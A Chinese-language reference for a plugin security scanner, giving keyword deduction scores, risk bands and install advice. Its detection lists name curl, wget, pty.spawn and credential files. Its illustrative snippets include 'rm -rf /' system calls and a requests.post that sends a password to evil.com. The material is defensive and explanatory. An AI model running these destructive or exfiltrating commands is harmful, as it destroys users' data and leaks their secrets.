# 安全扫描规则参考

本文档详细说明技能安全扫描的风险评估规则和标准。

## 风险评分算法

### 基础分数
所有文件从 **100 分** 起步。

### 扣分规则

| 等级 | 关键词 | 每次匹配扣分 |
|------|--------|--------------|
| 严重 | `eval(`, `exec(`, `os.system`, `subprocess.call`, `subprocess.run`, `__import__`, `importlib`, `pty.spawn` | -25 |
| 高危 | `requests.get`, `requests.post`, `urllib.request`, `http.client`, `socket.create_connection`, `curl`, `wget` | -20 |
| 中危 | `chmod`, `chown`, `sudo`, `chattr`, `.bashrc`, `.ssh/`, `/etc/passwd`, `/etc/shadow` | -15 |
| 低危 | `open(` + `write` + `base64` 组合 | -5 |

### 最终分数限制
- 最低: 0 分
- 最高: 100 分

## 风险等级划分

| 分数范围 | 风险等级 | 颜色 | 建议 |
|----------|----------|------|------|
| 81-100 | 低风险 | 🟢 绿色 | 允许安装 |
| 61-80 | 中风险 | 🟡 浅黄 | 谨慎安装，运行时监控 |
| 41-60 | 较高风险 | 🟠 黄色 | 沙箱测试，限制权限 |
| 21-40 | 高风险 | 🔶 橙色 | 禁止安装，查看源码 |
| 0-20 | 严重风险 | 🔴 红色 | 立即删除 |

## 关键词详解

### 严重风险 (-25分)

#### `eval()` / `exec()`
动态执行Python代码，可能导致任意代码执行。

**示例危险代码:**
```python
code = user_input
eval(code)  # 可能执行恶意代码
```

#### `os.system()`, `subprocess.call()`, `subprocess.run()`
执行系统命令，可能被利用执行Shell命令。

**示例危险代码:**
```python
os.system("rm -rf /")  # 危险！
subprocess.run(["rm", "-rf", "/"])  # 危险！
```

#### `__import__()`, `importlib`
动态导入模块，可能加载恶意代码。

#### `pty.spawn()`
创建伪终端，可能用于提权攻击。

### 高危风险 (-20分)

#### 网络请求相关
- `requests.get/post/put/delete`
- `urllib.request`
- `http.client`
- `socket.create_connection`

**风险:** 可能向外部服务器发送数据（数据外泄）

**示例:**
```python
import requests
requests.post("https://evil.com/steal", data={"pwd": password})
```

#### 外部工具下载
- `curl`
- `wget`

**风险:** 可能下载并执行恶意脚本

### 中危风险 (-15分)

#### 权限修改
- `chmod` - 修改文件权限
- `chown` - 修改文件所有者
- `sudo` - 提权命令

#### 持久化攻击
- `.bashrc` - Shell配置
- `.ssh/` - SSH配置目录

#### 系统信息收集
- `/etc/passwd` - 用户账户
- `/etc/shadow` - 密码哈希

### 低危风险 (-5分，组合出现)

#### 数据混淆
- `base64` + 文件写入/压缩

**可能用途:** 混淆数据以便外传

## 安全原则

1. **零误报不拦截** - 仅提示风险，不自动禁止
2. **先审计后安装** - 风险分<40的文件，不输出安装指引
3. **只读扫描** - 不修改原文件
4. **可追溯日志** - 记录扫描时间和结果

## 报告解读

### 总览摘要
- **总体建议: 允许安装** - 所有文件风险分≥61
- **总体建议: 需人工审核** - 有文件风险分41-60
- **总体建议: 建议撤下** - 有文件风险分≤40

### 分文件建议
- **允许安装** - 风险分≥61
- **谨慎安装** - 风险分41-60
- **需审核** - 风险分21-40
- **禁止/删除** - 风险分≤20
